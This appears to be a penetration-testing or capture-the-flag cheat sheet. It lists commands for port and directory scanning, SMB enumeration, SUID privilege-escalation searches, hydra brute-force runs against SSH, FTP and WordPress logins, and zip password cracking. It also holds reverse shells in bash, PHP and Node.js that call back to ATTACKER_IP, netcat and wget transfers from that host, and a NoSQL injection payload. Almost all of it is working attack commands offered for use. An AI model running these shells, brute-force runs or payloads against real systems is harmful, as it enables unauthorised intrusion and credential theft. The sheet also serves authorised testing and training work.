# Network and Web Enumeration

## Port Scanning and Service Detection

```bash
nmap -sV -p- <TARGET_IP>
```

## Directory and File Discovery

```bash
gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,js
```

```bash
gobuster dir -u https://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

## SMB and NetBIOS Enumeration

```bash
enum4linux <TARGET_IP>
```

# File Transfer Methods

## HTTP Server Setup

```bash
python -m SimpleHTTPServer
```

```bash
wget http://<ATTACKER_IP>:8000/<FILE_NAME>
```

## Netcat File Transfer

```bash
nc -lvnp 5555 > <FILE_NAME>
```

```bash
nc <ATTACKER_IP> 5555 < <FILE_NAME>
```

## Secure File Transfer

```bash
scp <USER_NAME>@<TARGET_IP>:<FILE_NAME> .
```

# Linux Privilege Escalation and System Commands

## Privilege and Permission Analysis

```bash
sudo -l
```

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
find / -user <USER_NAME> -type f 2>/dev/null
```

## Shell Upgrade and Stabilization

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Steganography and Image Analysis

## Metadata Extraction

```BASH
exiftool <IMAGE_NAME>.jpg
```

## Hidden Data Extraction

```bash
steghide extract -sf <IMAGE_NAME>.jpg
```

```bash
binwalk -e <IMAGE_NAME>.png
```

## Binwalk Compatibility Fix

```Bash
sed -i 's/CS_ARCH_ARM64/CS_ARCH_AARCH64/g' /usr/lib/python3/dist-packages/binwalk/modules/disasm.py
```

# Password Generation and Cracking

## Custom Wordlist Generation

```bash
crunch 18 18 -t '@@@@' > file.txt
```

## Network Service Brute Force Attacks

```bash
hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt ssh://<ATTACKER_IP>
```

```bash
hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt ftp://<ATTACKER_IP>
```

```bash
hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-get -s 8080 /
```

```bash
hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
```

## Archive Password Cracking

```bash
zip2john <FILE_NAME>.zip > hash.txt
john hash.txt
```

# File Transfer Protocol (FTP) Operations

## Basic FTP Commands

```bash
ftp <TARGET_IP>
anonymous
ls -la
get <FILE_NAME>
mget *
put <FILE_NAME>
```

# Server Message Block (SMB) Enumeration

## SMB Share Discovery

```bash
smbclient -L //<TARGET_IP> -N
```

```bash
smbclient -L //<TARGET_IP> -U <USER_NAME>
```

# Reverse Shell Techniques

## Netcat Listener Setup

```bash
nc -lvnp 4444
```

## Bash Reverse Shells

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > script.sh
```

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f" > script.sh
```

## PHP Reverse Shells

```php
<?php
$ip = '0.0.0.0';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
?>
```

## Node.js Reverse Shell

```js
require("child_process").exec(
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f"
);
```

# Metasploit Framework Usage

## Metasploit Commands

```bash
msfconsole
show options
set
run
```

# MongoDB

## Database Navigation Commands

```bash
mongo
show dbs
use
```

## NoSQL Injection Payloads

```
{"username":"test","password":{"$ne":""}}
```

# Online Tools and Resources

- [CyberChef](https://gchq.github.io/CyberChef/)
- [dCode](https://www.dcode.fr/en)
- [GTFOBins](https://gtfobins.github.io/)
- [Exploit Database](https://www.exploit-db.com/)
